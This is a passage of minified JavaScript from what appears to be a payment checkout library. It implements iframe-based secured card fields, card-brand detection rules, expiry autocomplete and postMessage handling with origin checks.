r=Cp({loadingContext:n.props.loadingContext},n.constructor.type);n.props.issuers=n.props.issuers.map((function(e){return ml(ml({},e),{icon:r(e.id)})}))}return n}return Al(t,e),t.prototype.formatProps=function(e){var t=e.details&&e.details.length&&(e.details.find((function(e){return"issuer"===e.key}))||{}).items||e.issuers||[];return ml(ml({},e),{issuers:t})},t.prototype.formatData=function(){var e,t;return{paymentMethod:{type:this.constructor.type,issuer:null===(t=null===(e=this.state)||void 0===e?void 0:e.data)||void 0===t?void 0:t.issuer}}},Object.defineProperty(t.prototype,"isValid",{get:function(){var e;return!!(null===(e=this.state)||void 0===e?void 0:e.isValid)},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(_p,ml({ref:function(t){e.componentRef=t},items:this.props.issuers},this.props,this.state,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.defaultProps={showImage:!0,onValid:function(){},issuers:[],loadingContext:mc},t}(Zc),Sp=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{showImage:!1})},t.type="billdesk_online",t}(xp),kp=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{showImage:!1,placeholder:"issuerList.wallet.placeholder"})},t.type="billdesk_wallet",t}(xp),Mp="encryptedCardNumber",Bp="encryptedExpiryDate",Ep="encryptedExpiryMonth",Tp="encryptedExpiryYear",Pp="encryptedSecurityCode",Ip="encryptedPassword",Fp="giftcard",Lp=["amex","mc","visa"],Op=["sepa","sepadirectdebit","ach",Fp],Np="required",Dp="optional",Rp="hidden",jp=Np,Up=Rp,$p=((wp={})["incomplete field"]="error.va.gen.01",wp["field not valid"]="error.va.gen.02",wp["luhn check failed"]="error.va.sf-cc-num.01",wp["Card too old"]="error.va.sf-cc-dat.01",wp["Date too far in future"]="error.va.sf-cc-dat.02",wp["Your card expires before check out date"]="error.va.sf-cc-dat.03",wp["Unsupported card entered"]="error.va.sf-cc-num.03",wp),zp=$p["incomplete field"],Hp=function(e,t){return t===Bp?(e.encryptedExpiryMonth=!1,e.encryptedExpiryYear=!1):e[t]=!1,e},Vp=function(e,t){var n="card"===e?"nocard":e||"nocard";return gc({type:n,extension:"svg",loadingContext:t})(n)};function Qp(e){return"object"==_typeof2(e)&&null!==e&&"[object Array]"===Object.prototype.toString.call(e)}function Gp(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n=Qp(e[0])?e[0]:e;return{from:function(e){return n.map((function(t){var n;return t in e?((n={})[t]=e[t],n):{}})).reduce((function(e,t){return ml(ml({},e),t)}),{})}}}function Wp(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n=Qp(e[0])?e[0]:e;return{from:function(e){var t=Object.keys(e).filter((function(e){return!n.includes(e)}));return Gp.apply(void 0,t).from(e)}}}var Kp=Object.prototype.toString;function qp(e){return"object"==_typeof2(e)&&null!==e&&"[object Array]"===Object.prototype.toString.call(e)}function Xp(e){return null!=e}function Yp(e){return!1!==e&&Xp(e)}function Jp(e){return!!e&&"object"==_typeof2(e)}var Zp=window.console&&window.console.error&&window.console.error.bind(window.console);window.console&&window.console.info&&window.console.info.bind(window.console);var eh=window.console&&window.console.log&&window.console.log.bind(window.console),th=window.console&&window.console.warn&&window.console.warn.bind(window.console);function nh(){var e;this.config.cardGroupTypes=qp(e=this.props.cardGroupTypes)&&e.length?e:Lp;var t=this.props.loadingContext;if(t){var n;this.config.loadingContext="/"===(n=t).charAt(n.length-1)?t:t+"/",this.config.isCreditCardType=!1===Op.includes(this.props.type),this.config.iframeUIConfig=this.props.iframeUIConfig,this.config.allowedDOMAccess=!(!1===this.props.allowedDOMAccess||"false"===this.props.allowedDOMAccess),this.config.autoFocus=!(!1===this.props.autoFocus||"false"===this.props.autoFocus),this.config.showWarnings=!0===this.props.showWarnings||"true"===this.props.showWarnings,this.config.trimTrailingSeparator=!(!1===this.props.trimTrailingSeparator||"false"===this.props.trimTrailingSeparator),this.config.keypadFix=!(!1===this.props.keypadFix||"false"===this.props.keypadFix),this.config.legacyInputMode=this.props.legacyInputMode||null,this.config.minimumExpiryDate=this.props.minimumExpiryDate||null,this.config.sfLogAtStart=!0===this.props._b$dl;var r=this.config.isCreditCardType?"card":this.props.type;-1<r.indexOf("sepa")&&(r="iban");var i=btoa(window.location.origin);this.config.iframeSrc=this.config.loadingContext+"securedfields/"+this.props.clientKey+"/3.5.3/securedFields.html?type="+r+"&d="+i}else th("WARNING Config :: no loadingContext has been specified!")}var rh=function(){};function ih(e){void 0===e&&(e={}),this.callbacks.onLoad=e.onLoad?e.onLoad:rh,this.callbacks.onConfigSuccess=e.onConfigSuccess?e.onConfigSuccess:rh,this.callbacks.onFieldValid=e.onFieldValid?e.onFieldValid:rh,this.callbacks.onAllValid=e.onAllValid?e.onAllValid:rh,this.callbacks.onBrand=e.onBrand?e.onBrand:rh,this.callbacks.onError=e.onError?e.onError:rh,this.callbacks.onFocus=e.onFocus?e.onFocus:rh,this.callbacks.onBinValue=e.onBinValue?e.onBinValue:rh,this.callbacks.onAutoComplete=e.onAutoComplete?e.onAutoComplete:rh,this.callbacks.onAdditionalSFConfig=e.onAdditionalSFConfig?e.onAdditionalSFConfig:rh,this.callbacks.onAdditionalSFRemoved=e.onAdditionalSFRemoved?e.onAdditionalSFRemoved:rh}var ah=function(e,t,n){if(t){var r=JSON.stringify(e);t.postMessage(r,n)}};function oh(e){if(e.fieldType!==Mp)return!1;var t={brand:e.brand,cvcPolicy:e.cvcPolicy,showSocialSecurityNumber:e.showSocialSecurityNumber},n=function(e,t){return!function e(t,n){void 0===t&&(t={}),void 0===n&&(n={});var r=Object.keys(t),i=Object.keys(n);if(r.length!==i.length)return!1;for(var a=0,o=r;a<o.length;a++){var s=o[a];if(Jp(t[s])&&!e(t[s],n[s]))return!1;if(t[s]!==n[s])return!1}return!0}(e,t)}(t,this.state.brand);if(!n)return null;var r="card"===this.state.type||"bcmc"===this.state.type;if(r&&n&&(this.state.brand=t,Object.prototype.hasOwnProperty.call(this.state.securedFields,Pp))){var i={txVariant:this.state.type,brand:t.brand,fieldType:Pp,cvcPolicy:e.cvcPolicy,numKey:this.state.securedFields.encryptedSecurityCode.numKey};ah(i,this.getIframeContentWin(Pp),this.config.loadingContext)}var a=r?Gp(["brand","cvcPolicy","cvcText","datePolicy","showSocialSecurityNumber"]).from(e):null;if(a&&a.brand){var o=a;o.type=this.state.type,o.rootNode=this.props.rootNode,this.callbacks.onBrand(o)}return!0}var sh=function(e){return{fieldType:e.fieldType,encryptedFieldName:e.encryptedFieldName,uid:e.uuid,valid:e.isValid,type:e.txVariant,rootNode:e.rootNode}},lh=function(e,t){var n=[];return e&&"function"==typeof e.querySelectorAll&&(n=[].slice.call(e.querySelectorAll(t))),n},ch=function(e,t){if(e)return e.querySelector(t)},uh=function(e,t){if(e)return e.getAttribute(t)},dh=function(e,t,n,r){if("function"!=typeof e.addEventListener){if(!e.attachEvent)throw new Error(": Unable to bind "+t+"-event");e.attachEvent("on"+t,n)}else e.addEventListener(t,n,r)},ph=function(e,t,n,r){if("function"==typeof e.addEventListener)e.removeEventListener(t,n,r);else{if(!e.attachEvent)throw new Error(": Unable to unbind "+t+"-event");e.detachEvent("on"+t,n)}},hh=function(e,t,n,r,i){if(!Object.prototype.hasOwnProperty.call(e,"error"))return null;var a=t,o={rootNode:r,fieldType:e.fieldType,error:null,type:null},s=""!==e.error;return s||a.hasError?a.errorType===$p["Unsupported card entered"]?null:(o.error=s?e.error:"",o.type=n,a.hasError=s,a.errorType=o.error,i(o),o):null};function fh(e){var t,n,r,i,a=e.fieldType;if("card"===this.state.type&&Object.prototype.hasOwnProperty.call(e,"cvcPolicy")&&Xp(e.cvcPolicy)&&Object.prototype.hasOwnProperty.call(this.state.securedFields,Pp)&&(this.state.securedFields.encryptedSecurityCode.cvcPolicy=e.cvcPolicy),hh(e,this.state.securedFields[a],this.state.type,this.props.rootNode,this.callbacks.onError),this.state.securedFields[a].isEncrypted){t=function(e){var t,n,r=e.fieldType,i=e.txVariant,a=e.rootNode,o=r===Bp,s=[],l=["encryptedExpiryMonth","encryptedExpiryYear"],c=o?2:1;for(t=0;t<c;t+=1){n=o?l[t]:r;var u=sh({fieldType:r,encryptedFieldName:o?n:r,uuid:i+"-encrypted-"+n,isValid:!1,txVariant:i,rootNode:a});s.push(u)}return s}({fieldType:a,txVariant:this.state.type,rootNode:this.props.rootNode}),a===Mp&&(t[0].endDigits="");for(var o=0,s=t.length;o<s;o+=1)this.config.allowedDOMAccess&&(n=this.props.rootNode,r=t[o].uid,(i=ch(n,"#"+r))&&n.removeChild(i)),this.callbacks.onFieldValid(t[o]);this.state.securedFields[a].isEncrypted=!1}this.assessFormValidity(),Object.prototype.hasOwnProperty.call(e,"brand")&&this.processBrand(e)}function Ah(e){var t,n,r=e.fieldType;this.config.autoFocus&&("year"!==e.type&&r!==Tp||this.setFocusOnFrame(Pp),r===Ep&&this.setFocusOnFrame(Tp));var i=e[r];this.state.securedFields[r].isEncrypted=!0,this.config.allowedDOMAccess&&function(e,t,n){var r,i,a,o,s,l,c,u;for(r=0;r<e.length;r+=1){var d=e[r];i=t+"-encrypted-"+(a=d.encryptedFieldName),s=a,l=d.blob,u=void 0,(u=ch(o=n,"#"+(c=i)))||((u=document.createElement("input")).type="hidden",u.name=s,u.id=c,o.appendChild(u)),u.setAttribute("value",l)}}(i,this.state.type,this.props.rootNode),hh({error:"",fieldType:r},this.state.securedFields[r],this.state.type,this.props.rootNode,this.callbacks.onError);var a=function(e){var t,n,r,i,a,o=e.fieldType,s=e.txVariant,l=e.rootNode,c=e.encryptedObjArr,u=[];for(t=0;t<c.length;t+=1){n=s+"-encrypted-"+(i=(r=c[t]).encryptedFieldName),a=r.blob;var d=sh({fieldType:o,encryptedFieldName:i,uuid:n,isValid:!0,txVariant:s,rootNode:l});d.blob=a,u.push(d)}return u}({fieldType:r,txVariant:this.state.type,rootNode:this.props.rootNode,encryptedObjArr:i});if(r===Ep&&Object.prototype.hasOwnProperty.call(this.state.securedFields,Tp)){var o={txVariant:this.state.type,code:e.code,blob:i[0].blob,fieldType:Tp,numKey:this.state.securedFields.encryptedExpiryYear.numKey};ah(o,this.getIframeContentWin(Tp),this.config.loadingContext)}for(r===Mp&&Yp(e.endDigits)&&(a[0].endDigits=e.endDigits),t=0,n=a.length;t<n;t+=1)this.callbacks.onFieldValid(a[t]);this.assessFormValidity()}var mh={__NO_BRAND:"noBrand",cards:[]};mh.cards.push({cardType:"mc",startingRules:[51,52,53,54,55,22,23,24,25,26,27],permittedLengths:[16],pattern:/^(5[1-5][0-9]{0,14}|2[2-7][0-9]{0,14})$/,securityCode:"CVC"}),mh.cards.push({cardType:"visadankort",startingRules:[4571],permittedLengths:[16],pattern:/^(4571)[0-9]{0,12}$/}),mh.cards.push({cardType:"visa",startingRules:[4],permittedLengths:[13,16,19],pattern:/^4[0-9]{0,18}$/,securityCode:"CVV"}),mh.cards.push({cardType:"amex",startingRules:[34,37],permittedLengths:[15],pattern:/^3[47][0-9]{0,13}$/,securityCode:"CID"}),mh.cards.push({cardType:"diners",startingRules:[36],permittedLengths:[14],pattern:/^(36)[0-9]{0,12}$/}),mh.cards.push({cardType:"maestrouk",startingRules:[6759],permittedLengths:[16,18,19],pattern:/^(6759)[0-9]{0,15}$/}),mh.cards.push({cardType:"solo",startingRules:[6767],permittedLengths:[16,18,19],pattern:/^(6767)[0-9]{0,15}$/}),mh.cards.push({cardType:"laser",startingRules:[6304,6706,677117,677120],permittedLengths:[16,17,18,19],pattern:/^(6304|6706|6709|6771)[0-9]{0,15}$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"discover",startingRules:[6011,644,645,646,647,648,649,65],permittedLengths:[16],pattern:/^(6011[0-9]{0,12}|(644|645|646|647|648|649)[0-9]{0,13}|65[0-9]{0,14})$/}),mh.cards.push({cardType:"jcb",startingRules:[3528,3529,353,354,355,356,357,358],permittedLengths:[16,19],pattern:/^(352[8,9]{1}[0-9]{0,15}|35[4-8]{1}[0-9]{0,16})$/,securityCode:"CAV"}),mh.cards.push({cardType:"bcmc",startingRules:[6703,479658,606005],permittedLengths:[16,17,18,19],pattern:/^((6703)[0-9]{0,15}|(479658|606005)[0-9]{0,13})$/,cvcPolicy:"hidden"}),mh.cards.push({cardType:"bijcard",startingRules:[5100081],permittedLengths:[16],pattern:/^(5100081)[0-9]{0,9}$/}),mh.cards.push({cardType:"dankort",startingRules:[5019],permittedLengths:[16],pattern:/^(5019)[0-9]{0,12}$/}),mh.cards.push({cardType:"hipercard",startingRules:[606282],permittedLengths:[16],pattern:/^(606282)[0-9]{0,10}$/}),mh.cards.push({cardType:"cup",startingRules:[62,81],permittedLengths:[14,15,16,17,18,19],pattern:/^(62|81)[0-9]{0,17}$/}),mh.cards.push({cardType:"maestro",startingRules:[50,56,57,58,6],permittedLengths:[16,17,18,19],pattern:/^(5[0|6-8][0-9]{0,17}|6[0-9]{0,18})$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"elo",startingRules:[506699,50670,50671,50672,50673,50674,50675,50676,506770,506771,506772,506773,506774,506775,506776,506777,506778,401178,438935,451416,457631,457632,504175,627780,636297,636368],permittedLengths:[16],pattern:/^((((506699)|(506770)|(506771)|(506772)|(506773)|(506774)|(506775)|(506776)|(506777)|(506778)|(401178)|(438935)|(451416)|(457631)|(457632)|(504175)|(627780)|(636368)|(636297))[0-9]{0,10})|((50676)|(50675)|(50674)|(50673)|(50672)|(50671)|(50670))[0-9]{0,11})$/}),mh.cards.push({cardType:"uatp",startingRules:[1],permittedLengths:[15],pattern:/^1[0-9]{0,14}$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"cartebancaire",startingRules:[4,5,6],permittedLengths:[16],pattern:/^[4-6][0-9]{0,15}$/}),mh.cards.push({cardType:"visaalphabankbonus",startingRules:[450903],permittedLengths:[16],pattern:/^(450903)[0-9]{0,10}$/}),mh.cards.push({cardType:"mcalphabankbonus",startingRules:[510099],permittedLengths:[16],pattern:/^(510099)[0-9]{0,10}$/}),mh.cards.push({cardType:"hiper",startingRules:[637095,637568,637599,637609,637612],permittedLengths:[16],pattern:/^(637095|637568|637599|637609|637612)[0-9]{0,10}$/}),mh.cards.push({cardType:"oasis",startingRules:[982616],permittedLengths:[16],pattern:/^(982616)[0-9]{0,10}$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"karenmillen",startingRules:[98261465],permittedLengths:[16],pattern:/^(98261465)[0-9]{0,8}$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"warehouse",startingRules:[982633],permittedLengths:[16],pattern:/^(982633)[0-9]{0,10}$/,cvcPolicy:"optional"}),mh.cards.push({cardType:"mir",startingRules:[220],permittedLengths:[16,17,18,19],pattern:/^(220)[0-9]{0,16}$/}),mh.cards.push({cardType:"codensa",startingRules:[590712],permittedLengths:[16],pattern:/^(590712)[0-9]{0,10}$/}),mh.cards.push({cardType:"naranja",startingRules:[377798,377799,402917,402918,527571,527572,589562],permittedLengths:[16,17,18,19],pattern:/^(37|40|5[28])([279])\d*$/}),mh.cards.push({cardType:"cabal",startingRules:[589657,600691,603522,6042,6043,636908],permittedLengths:[16,17,18,19],pattern:/^(58|6[03])([03469])\d*$/}),mh.cards.push({cardType:"shopping",startingRules:[2799,589407,603488],permittedLengths:[16,17,18,19],pattern:/^(27|58|60)([39])\d*$/}),mh.cards.push({cardType:"argencard",startingRules:[501],permittedLengths:[16,17,18,19],pattern:/^(50)(1)\d*$/}),mh.cards.push({cardType:"troy",startingRules:[9792],permittedLengths:[16],pattern:/^(97)(9)\d*$/}),mh.cards.push({cardType:"forbrugsforeningen",startingRules:[600722],permittedLengths:[16],pattern:/^(60)(0)\d*$/}),mh.cards.push({cardType:"vpay",startingRules:[401,408,413,434,435,437,439,441,442,443,444,446,447,455,458,460,461,463,466,471,479,482,483,487],permittedLengths:[13,14,15,16,17,18,19],pattern:/^(40[1,8]|413|43[4,5]|44[1,2,3,4,6,7]|45[5,8]|46[0,1,3,6]|47[1,9]|48[2,3,7])[0-9]{0,16}$/}),mh.cards.push({cardType:"rupay",startingRules:[508528],permittedLengths:[16],pattern:/^(100003|508(2|[5-9])|60(69|[7-8])|652(1[5-9]|[2-5][0-9]|8[5-9])|65300[3-4]|8172([0-1]|[3-5]|7|9)|817(3[3-8]|40[6-9]|410)|35380([0-2]|[5-6]|9))[0-9]{0,12}$/});var vh=function(e){return mh.cards.filter((function(t){return t.cardType===e}))[0]};mh.__NO_BRAND,mh.cards;var gh,yh=function(e){var t=$p[e];return t||(t=Object.keys($p).find((function(t){return $p[t]===e})))||e},bh=function(e){function t(t,n){var r=e.call(this)||this,i=["fieldType","iframeSrc","cvcPolicy","datePolicy","loadingContext","holderEl"],a=Wp(i).from(t);r.config=ml(ml(ml({},r.config),a),{iframeUIConfig:ml({},a.iframeUIConfig)});var o=Gp(i).from(t);return r.fieldType=o.fieldType,r.cvcPolicy=o.cvcPolicy,r.datePolicy=o.datePolicy,r.iframeSrc=o.iframeSrc,r.loadingContext=o.loadingContext,r.holderEl=o.holderEl,r.isValid=!1,r.iframeContentWindow=null,r.numKey=function(){if(!window.crypto)return 4294967296*Math.random()|0;var e=new Uint32Array(1);return window.crypto.getRandomValues(e),e[0]}(),r.isEncrypted=!1,r.hasError=!1,r.errorType="",r.init(n)}return Al(t,e),t.prototype.init=function(e){var t,n,r,i,a,o,s,l,c,u,d,p,h=(t=this.config,n=this.fieldType,r=e,l="card"===t.txVariant?"creditCard":t.txVariant,c=r.get(l+"."+n+".aria.iframeTitle"),u=r.get(l+"."+n+".aria.label"),d=r.locale,a=r,(s=ml({},{iframeTitle:c,label:u})).error=s.error?s.error:(o=a,Object.keys($p).reduce((function(e,t){var n=$p[t];return(-1<n.indexOf("sf-")||-1<n.indexOf("gen.01"))&&(e[n]=o.get(n)),e}),{})),p=s,ml(ml({},d&&{lang:d}),((i={})[n]=p,i)));this.config.iframeUIConfig.ariaConfig=h;var f,A,m,v,g,y,b,_,w,C,x=(f=this.config,A=this.fieldType,m=e,w=f.txVariant,(_={}).encryptedCardNumber=(b=m).get&&b.get("creditCard.numberField.placeholder"),_.encryptedExpiryDate=b.get&&b.get("creditCard.expiryDateField.placeholder"),_.encryptedExpiryMonth=b.get&&b.get("creditCard.expiryDateField.month.placeholder"),_.encryptedExpiryYear=b.get&&b.get("creditCard.expiryDateField.year.placeholder"),_.encryptedSecurityCode=b.get&&b.get("creditCard.cvcField.placeholder"),_.encryptedSecurityCode3digits=b.get&&b.get("creditCard.cvcField.placeholder.3digits"),_.encryptedSecurityCode4digits=b.get&&b.get("creditCard.cvcField.placeholder.4digits"),_.encryptedPassword=b.get&&b.get("creditCard.encryptedPassword.placeholder"),C=_,ml(ml(ml({},A!==Pp&&((v={})[A]=C[A],v)),A===Pp&&w===Fp&&((g={})[A]=C[A],g)),A===Pp&&w!==Fp&&((y={}).encryptedSecurityCode3digits=C.encryptedSecurityCode3digits,y.encryptedSecurityCode4digits=C.encryptedSecurityCode4digits,y)));this.config.iframeUIConfig.placeholders=x;var S=function(e){var t=e.src,n=e.title,r=void 0===n?"iframe element":n,i=e.policy,a=void 0===i?"origin":i,o=e.styleStr,s=void 0===o?"border: none; height:100%; width:100%;":o,l=document.createElement("iframe");l.setAttribute("src",t),l.setAttribute("class","js-iframe"),l.setAttribute("title",r),l.setAttribute("frameborder","0"),l.setAttribute("scrolling","no"),l.setAttribute("allowtransparency","true"),l.setAttribute("style",s),l.setAttribute("referrerpolicy",a);var c=document.createTextNode("<p>Your browser does not support iframes.</p>");return l.appendChild(c),l}({src:this.iframeSrc,title:h[this.fieldType].iframeTitle,policy:"origin"});this.holderEl.appendChild(S);var k=ch(this.holderEl,".js-iframe");return k&&(this.iframeContentWindow=k.contentWindow,this.iframeOnLoadListener=this.iframeOnLoadListenerFn,dh(k,"load",this.iframeOnLoadListener,!1)),this},t.prototype.iframeOnLoadListenerFn=function(){ph(window,"load",this.iframeOnLoadListener,!1),this.postMessageListener=this.postMessageListenerFn,dh(window,"message",this.postMessageListener,!1);var e={fieldType:this.fieldType,cvcPolicy:this.cvcPolicy,numKey:this.numKey,txVariant:this.config.txVariant,extraFieldData:this.config.extraFieldData,cardGroupTypes:this.config.cardGroupTypes,iframeUIConfig:this.config.iframeUIConfig,sfLogAtStart:this.config.sfLogAtStart,showWarnings:this.config.showWarnings,trimTrailingSeparator:this.config.trimTrailingSeparator,isCreditCardType:this.config.isCreditCardType,legacyInputMode:this.config.legacyInputMode,minimumExpiryDate:this.config.minimumExpiryDate};ah(e,this.iframeContentWindow,this.loadingContext),this.onIframeLoadedCallback()},t.prototype.postMessageListenerFn=function(e){if(i=e,a=this.loadingContext,o=this.config.showWarnings,s=i.origin,u=(c=-1<(l=a.indexOf("/checkoutshopper/"))?a.substring(0,l):a).length-1,"/"===c.charAt(u)&&(c=c.substring(0,u)),s===c||(o&&(th("WARNING postMessageValidation: postMessage listener for iframe::origin mismatch!\n Received message with origin:",s,"but the only allowed origin for messages to CSF is",c),th("### event.data=",i.data)),0)){var t;try{t=JSON.parse(e.data)}catch(t){return(r=e).data&&r.data.type&&"string"==typeof r.data.type&&-1<r.data.type.indexOf("webpack")?void(this.config.showWarnings&&eh("### SecuredField::postMessageListenerFn:: PARSE FAIL - WEBPACK")):(n=e).data&&"string"==typeof n.data&&-1<n.data.indexOf("cvox")?void(this.config.showWarnings&&eh("### SecuredField::postMessageListenerFn:: PARSE FAIL - CHROMEVOX")):void(this.config.showWarnings&&eh("### SecuredField::postMessageListenerFn:: PARSE FAIL - UNKNOWN REASON: event.data=",e.data))}if(Object.prototype.hasOwnProperty.call(t,"action")&&Object.prototype.hasOwnProperty.call(t,"numKey"))if(this.numKey===t.numKey)switch(t.action){case"encryption":this.isValid=!0,this.onEncryptionCallback(t);break;case"config":this.onConfigCallback(t);break;case"focus":this.onFocusCallback(t);break;case"binValue":this.onBinValueCallback(t);break;case"click":this.onClickCallback(t);break;case"shifttab":this.onShiftTabCallback(t);break;case"autoComplete":this.onAutoCompleteCallback(t);break;default:this.isValid=!1,this.onValidationCallback(t)}else this.config.showWarnings&&th("WARNING SecuredField :: postMessage listener for iframe :: data mismatch! (Probably a message from an unrelated securedField)");else this.config.showWarnings&&th("WARNING SecuredField :: postMessage listener for iframe :: data mismatch!")}var n,r,i,a,o,s,l,c,u},t.prototype.destroy=function(){ph(window,"message",this.postMessageListener,!1),this.iframeContentWindow=null,function(e){for(;e.firstChild;)e.removeChild(e.firstChild)}(this.holderEl)},t.prototype.onIframeLoaded=function(e){return this.onIframeLoadedCallback=e,this},t.prototype.onEncryption=function(e){return this.onEncryptionCallback=e,this},t.prototype.onValidation=function(e){return this.onValidationCallback=e,this},t.prototype.onConfig=function(e){return this.onConfigCallback=e,this},t.prototype.onFocus=function(e){return this.onFocusCallback=e,this},t.prototype.onBinValue=function(e){return this.onBinValueCallback=e,this},t.prototype.onClick=function(e){return this.onClickCallback=e,this},t.prototype.onShiftTab=function(e){return this.onShiftTabCallback=e,this},t.prototype.onAutoComplete=function(e){return this.onAutoCompleteCallback=e,this},Object.defineProperty(t.prototype,"errorType",{get:function(){return this._errorType},set:function(e){this._errorType=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"hasError",{get:function(){return this._hasError},set:function(e){this._hasError=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isValid",{get:function(){if(this.fieldType===Pp)switch(this.cvcPolicy){case Rp:return!0;case Dp:return!this.hasError;default:return this._isValid}return this.fieldType===Bp&&this.datePolicy===Up||this._isValid},set:function(e){this._isValid=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"cvcPolicy",{get:function(){return this._cvcPolicy},set:function(e){this.fieldType===Pp&&e!==this.cvcPolicy&&(this._cvcPolicy=e,this.hasError&&"isValidated"===this.errorType&&(this.hasError=!1))},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"datePolicy",{get:function(){return this._datePolicy},set:function(e){this.fieldType===Bp&&e!==this.datePolicy&&(this._datePolicy=e)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"iframeContentWindow",{get:function(){return this._iframeContentWindow},set:function(e){this._iframeContentWindow=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isEncrypted",{get:function(){return this._isEncrypted},set:function(e){this._isEncrypted=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"numKey",{get:function(){return this._numKey},set:function(e){this._numKey=e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"iframeOnLoadListener",{get:function(){return this._iframeOnLoadListener},set:function(e){this._iframeOnLoadListener=e.bind(this)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"postMessageListener",{get:function(){return this._postMessageListener},set:function(e){this._postMessageListener=e.bind(this)},enumerable:!1,configurable:!0}),t}((function(){this.config={}}));function _h(){this.encryptedAttrName="data-encrypted-field";var e=lh(this.props.rootNode,"["+this.encryptedAttrName+"]");return e.length||(this.encryptedAttrName="data-cse",e=lh(this.props.rootNode,"["+this.encryptedAttrName+"]")),gh=Np,this.config.isCreditCardType?(this.isSingleBrandedCard=!1,this.securityCode="",this.createCardSecuredFields(e)):this.createNonCardSecuredFields(e)}function wh(e){return e.forEach(this.setupSecuredField.bind(this)),e.length}function Ch(e){var t=this,n=this.state.type;if("card"===n&&1===this.config.cardGroupTypes.length&&(n=this.config.cardGroupTypes[0],this.state.type=n),this.isSingleBrandedCard="card"!==n,this.isSingleBrandedCard){var r=vh(n);Xp(r)?(gh=r.cvcPolicy||Np,this.securityCode=r.securityCode):this.state.type="unrecognised-single-brand"}if(e.forEach(this.setupSecuredField.bind(this)),this.isSingleBrandedCard){var i={type:this.state.type,rootNode:this.props.rootNode,brand:n,cvcPolicy:gh,cvcText:this.securityCode};setTimeout((function(){t.callbacks.onBrand(i)}),0)}return e.length}function xh(e){var t=this,n=uh(e,this.encryptedAttrName);n===Tp&&(this.state.hasSeparateDateFields=!0);var r={fieldType:n,extraFieldData:uh(e,"data-info"),txVariant:this.state.type,cardGroupTypes:this.config.cardGroupTypes,iframeUIConfig:this.config.iframeUIConfig?this.config.iframeUIConfig:{},sfLogAtStart:this.config.sfLogAtStart,trimTrailingSeparator:this.config.trimTrailingSeparator,cvcPolicy:gh,datePolicy:jp,isCreditCardType:this.config.isCreditCardType,iframeSrc:this.config.iframeSrc,loadingContext:this.config.loadingContext,showWarnings:this.config.showWarnings,holderEl:e,legacyInputMode:this.config.legacyInputMode,minimumExpiryDate:this.config.minimumExpiryDate},i=new bh(r,this.props.i18n).onIframeLoaded((function(){t.state.iframeCount+=1,t.state.iframeCount===t.state.originalNumIframes&&t.callbacks.onLoad({iframesLoaded:!0})})).onConfig((function(e){t.handleIframeConfigFeedback(e)})).onFocus((function(e){t.handleFocus(e)})).onBinValue((function(e){t.handleBinValue(e)})).onClick((function(e){t.postMessageToAllIframes({fieldType:e.fieldType,click:!0})})).onShiftTab((function(e){t.handleSFShiftTab(e.fieldType)})).onEncryption((function(e){t.handleEncryption(e)})).onValidation((function(e){t.handleValidation(e)})).onAutoComplete((function(e){t.processAutoComplete(e)}));this.state.securedFields[n]=i}function Sh(e,t){if(Object.prototype.hasOwnProperty.call(this.state.securedFields,e)){var n={txVariant:this.state.type,fieldType:e,focus:!0,numKey:this.state.securedFields[e].numKey};ah(n,this.getIframeContentWin(e),this.config.loadingContext)}}function kh(e){var t=this,n=Object.keys(e||{});n.length&&Object.keys(this.state.securedFields).forEach((function(r){var i={txVariant:t.state.type,fieldType:r,numKey:t.state.securedFields[r].numKey};n.forEach((function(t){i[t]=e[t]})),ah(i,t.getIframeContentWin(r),t.config.loadingContext)}))}function Mh(){var e=this;this.postMessageToAllIframes({destroy:!0}),Object.keys(this.state.securedFields).forEach((function(t){var n=e.state.securedFields[t];n&&n.destroy(),e.state.securedFields[t]=null})),this.destroyTouchendListener(),this.state.securedFields={}}function Bh(e){var t=this;if("cc-name"===e.name){var n=ml({},e);delete n.numKey;var r=n;this.callbacks.onAutoComplete(r)}if("cc-exp"===e.name){var i=e.value.replace(/[^0-9]/gi,"/").split("/");if(2!==i.length)return;1===i[0].length&&(i[0]="0"+i[0]);var a=i[0],o=i[1].substr(2),s=a+"/"+o;if(Object.prototype.hasOwnProperty.call(this.state.securedFields,Bp)){var l={txVariant:this.state.type,fieldType:Bp,autoComplete:s,numKey:this.state.securedFields.encryptedExpiryDate.numKey};return void ah(l,this.getIframeContentWin(Bp),this.config.loadingContext)}Object.prototype.hasOwnProperty.call(this.state.securedFields,Ep)&&(l={txVariant:this.state.type,fieldType:Ep,autoComplete:a,numKey:this.state.securedFields.encryptedExpiryMonth.numKey},ah(l,this.getIframeContentWin(Ep),this.config.loadingContext)),Object.prototype.hasOwnProperty.call(this.state.securedFields,Tp)&&setTimeout((function(){var e={txVariant:t.state.type,fieldType:Tp,autoComplete:o,numKey:t.state.securedFields.encryptedExpiryYear.numKey};ah(e,t.getIframeContentWin(Tp),t.config.loadingContext)}),0)}}function Eh(e){var t=ml({},e);delete t.numKey,t.rootNode=this.props.rootNode,t.type=this.state.type;var n=t.fieldType;t.focus?this.state.currentFocusObject!==n&&(this.state.currentFocusObject=n,this.state.registerFieldForIos||this.handleAdditionalFields()):this.state.currentFocusObject===n&&(this.state.currentFocusObject=null);var r=t;r.currentFocusObject=this.state.currentFocusObject,this.callbacks.onFocus(r)}function 